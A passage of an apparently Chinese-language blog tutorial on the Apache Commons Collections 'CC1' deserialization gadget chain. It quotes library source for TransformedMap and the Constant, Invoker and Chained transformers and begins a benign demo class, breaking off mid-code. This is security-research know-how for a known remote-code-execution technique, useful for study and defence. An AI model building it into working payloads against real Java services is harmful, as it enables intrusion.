class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decorates another &lt;code&gt;Map&lt;/code&gt; to transform objects that are added.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The Map put methods and Map.Entry setValue method are affected by this class.</span></span><br><span class="line"><span class="comment"> * Thus objects must be removed or searched for using their transformed form.</span></span><br><span class="line"><span class="comment"> * For example, if the transformation converts Strings to Integers, you must</span></span><br><span class="line"><span class="comment"> * use the Integer form to remove objects.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This class is Serializable from Commons Collections 3.1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.11 $ $Date: 2004/06/07 22:14:42 $</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMap</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">AbstractInputCheckedMapDecorator</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li><li><p>查看它的decorate()和构造函数</p><ol><li><p>是个静态方法，里面调用了类的protected构造器。根据注释就可以理解，decorate()方法的第一个参数就是要修饰的Map对象，第二个和第三个参数都是实现了Transformer接口的类的对象，分别用来转换Map的键和值。为null的话就意味着没有转换。<strong>返回的Map是被修饰后的Map对象</strong>，本身也受到影响</p><ol><li>这里和构造方法也是一样的逻辑</li><li>这里的KeyTransformer和ValueTransformer<strong>需要自己自定义行为</strong>，实现对于接口即可</li></ol></li><li><p>可以知道<code>The Map put methods and Map.Entry setValue method are affected by this class</code>，<strong>使用put还有setValue方法的时候</strong>，会调用相应的Transformer的transform()方法进行响应的转换</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>From p牛: keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类</p></blockquote> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Factory method to create a transforming map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the map being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment"> * are NOT transformed.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点放在<code>transform()</code>函数上: 这里的<code>transform()</code>是调用的key和value的转换器的该方法</p><ol><li><code>transformKey()</code>: 对key调用<code>transform()</code>方法</li><li><code>transformValue()</code>: 对值调用<code>transform()</code>方法</li><li><code>transformMap()</code>: 对key和值都调用<code>transform()</code></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a key.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a value.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms a map.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The transformer itself may throw an exception if necessary.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> map  the map to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> the transformed object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Map <span class="title function_">transformMap</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">    <span class="type">Map</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedMap</span>(map.size());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">Iterator</span> <span class="variable">it</span> <span class="operator">=</span> map.entrySet().iterator(); it.hasNext(); ) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) it.next();</span><br><span class="line">        result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><ol><li><p>根据注释，会返回一个新的常值转换器</p><ol><li>不会对输入的对象检查，最佳实践是做为常量对象的一个转换器工厂</li><li>iConstant是一个private final对象，<strong>赋值后无法进行修改</strong></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that returns the same constant each time.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * No check is made that the object is immutable. In general, only immutable</span></span><br><span class="line"><span class="comment"> * objects should use the constant factory. Mutable objects should</span></span><br><span class="line"><span class="comment"> * use the prototype factory.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.5 $ $Date: 2004/05/16 11:36:31 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>看看这里的tranform函数</p><ol><li>对于输入都返回一开始确定的那一个iConstant，这里是创建时的参数</li><li>如果传入想要获取的<code>ConstantToReturn</code>是null在构造函数时就会直接返回新的null对象</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input by ignoring it and returning the stored constant instead.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object which is ignored</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the stored constant</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><ol><li><p>接口信息：会利用反射创建一个对象，每一个对象只包含一个函数可以通过反射进行调用 -&gt; 通过<code>transform(...)</code>进行触发</p><ol><li>特点<ol><li><p>其中有<code>paramTypes = (Class[]) paramTypes.clone()</code>和<code>args = (Object[]) args.clone();</code>经查阅<code>clone()</code>可以暂时理解为返回一个新的一摸一样的对象（防止对原始对象进行修改）</p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates and returns a copy of this object.  The precise meaning</span></span><br><span class="line"><span class="comment"> * of &quot;copy&quot; may depend on the class of the object. The general</span></span><br><span class="line"><span class="comment"> * intent is that, for any object &#123;<span class="doctag">@code</span> x&#125;, the expression:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone() != x&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be true, and that the expression:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone().getClass() == x.getClass()&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be &#123;<span class="doctag">@code</span> true&#125;, but these are not absolute requirements.</span></span><br><span class="line"><span class="comment"> * While it is typically the case that:</span></span><br><span class="line"><span class="comment"> * &lt;blockquote&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> * x.clone().equals(x)&lt;/pre&gt;&lt;/blockquote&gt;</span></span><br><span class="line"><span class="comment"> * will be &#123;<span class="doctag">@code</span> true&#125;, this is not an absolute requirement.</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li><li><p>提供了两个构造函数</p><ol><li><code>public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code></li><li><code>private InvokerTransformer(String methodName)</code>，拥有私有的构造函数，通过<code>getInstance()</code>获取对象实例</li></ol></li></ol></li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that creates a new object instance by reflection.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/26 21:44:05 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点放在<code>transform</code>方法上：会对输入调用方法并返回作为输出</p><ol><li>可以见到在内部直接使用了<strong>反射</strong>，结合iMethodName和iParamTypes这两个内置参数</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><ol><li><p>看看源码与注释：宏观上是将多个transformer子类对象连接在一起</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transformer implementation that chains the specified transformers together.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * The input object is passed to the first transformer. The transformed result</span></span><br><span class="line"><span class="comment"> * is passed to the second transformer and so on.</span></span><br><span class="line"><span class="comment"> * 这里说明这是链式传递，可以理解为linux中的管道 |</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> Commons Collections 3.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Revision: 1.7 $ $Date: 2004/05/16 11:36:31 $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Stephen Colebourne</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重点来到<code>transform()</code>函数这里：对同一个对象(传入的)<strong>按顺序</strong>调用iTransformers数组中各个transformer的<code>transform(object)</code>函数</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result via each decorated transformer</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object  the input object passed to the first transformer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);    <span class="comment">// 可以看到这里时反复利用，状态叠加</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="实现一下"><a href="#实现一下" class="headerlink" title="实现一下"></a>实现一下</h4><blockquote><p>再多的疑惑，实现一下就ok了</p></blockquote><ol><li>实现的逻辑是<ol><li>**转换触发点:**基于TransformedMap的<code>put()</code>方法会自动调用键值转换器的<code>transform()</code> –&gt; 如果是<code>setValue()</code>这里也可以</li><li>通过在键值转换器自定义&#x2F;选择，可以构造想要的调用</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CC1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出关键</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">printMap</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (Object entry: map.entrySet()) &#123;</span><br><span class="line">            System.out.println(((Map.Entry)entry).getKey());</span><br><span class="line">            System.out.println(((Map.Entry)entry).getValue());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">transformedMapTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="keyword">new</span> <span class="title class_">KeyTransformer</span>(), <span class="keyword">new</span> <span class="title class_">ValueTransformer</span>());</span><br><span class="line">        outerMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);    <span class="comment">// 说过在put()和setValue()处调用</span></span><br><span class="line">        printMap(innerMap);</span><br><span class="line">        printMap(outerMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">constantTransformerTest</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap,<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;hello world&quot;</span>));</span><br><span class="line">        outerMap.put(<span class="string">&quot;key1&quot;</span>,<span class="string">&quot;value1&quot;</span>);  <span class="comment">// 在put()的时候进行了修改存储的内容在outerMap中</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;key2&quot;</span>,<span 